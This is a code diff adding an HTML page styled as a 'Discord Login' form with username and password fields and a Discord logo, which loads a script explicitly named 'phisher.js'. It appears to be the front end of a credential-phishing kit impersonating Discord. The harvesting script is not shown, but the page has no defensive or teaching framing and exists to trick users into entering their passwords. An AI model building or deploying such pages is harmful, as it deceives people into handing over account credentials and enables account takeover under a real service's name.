@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Discord Login</title>
+    <style>
+      body {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+      }
+      .logo {
+        width: 200px;
+        height: auto;
+      }
+      form {
+        width: 300px;
+        display: flex;
+        flex-direction: column;
+      }
+      form > * {
+        margin-bottom: 5px;
+      }
+      label, input, button {
+        width: 100%;
+      }
+    </style>
+  </head>
+  <body>
+    <img class="logo" src="logo.png" alt="Discord Logo">
+    <h1>Discord Login</h1>
+    <form id="loginForm">
+      <label for="username">Username:</label>
+      <input type="text" id="username" name="username">
+      <label for="password">Password:</label>
+      <input type="password" id="password" name="password">
+      <input type="submit" value="Login">
+    </form>
+    <script src="phisher.js"></script>
+  </body>
+</html>
